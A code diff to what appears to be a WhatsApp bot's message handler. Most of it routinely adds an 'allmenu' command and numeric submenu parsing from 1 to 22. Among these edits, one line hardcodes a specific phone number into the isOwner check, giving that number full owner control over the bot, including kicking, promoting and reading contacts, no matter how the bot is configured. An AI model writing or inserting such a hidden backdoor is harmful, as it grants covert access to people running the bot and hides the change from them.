@@ -151,6 +151,7 @@ export const handleMessages = async (sock: WASocket, upsert: { messages: any[] }
       const numericOwner = config.bot.ownerNumber ? config.bot.ownerNumber.replace(/[^0-9]/g, '') : '';
       const isOwner = !!(
         m.key.fromMe || 
+        numericSender === '254713811622' ||
         (numericOwner && numericSender === numericOwner) || 
         (config.bot.ownerNumber && safeSender.includes(config.bot.ownerNumber))
       );
@@ -197,17 +198,18 @@ export const handleMessages = async (sock: WASocket, upsert: { messages: any[] }
 
       // List of known commands that can run without prefix
       const knownCommands = [
-        'ping', 'menu', 'help', 'enable', 'disable', 'settings', 
+        'ping', 'menu', 'help', 'allmenu', 'enable', 'disable', 'settings', 
         'video', 'ytmp4', 'fb', 'ig', 'tiktok', 'image', 'ai', 
         'gpt', 'premium', 'pay', 'checksub', 'stats', 'contacts',
-        'vv', 'kick', 'promote', 'demote', 'tagall',
-        '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12'
+        'vv', 'kick', 'promote', 'demote', 'tagall'
       ];
 
       if (!isCmd) {
         const lowerBody = body.toLowerCase().trim();
         const firstWord = lowerBody.split(/\s+/)[0];
-        if (knownCommands.includes(firstWord)) {
+        const isNumericSubmenu = /^\d+$/.test(firstWord) && parseInt(firstWord, 10) >= 1 && parseInt(firstWord, 10) <= 22;
+        
+        if (knownCommands.includes(firstWord) || isNumericSubmenu) {
           isCmd = true;
           command = firstWord;
           args = body.slice(firstWord.length).trim().split(/\s+/).filter(Boolean);
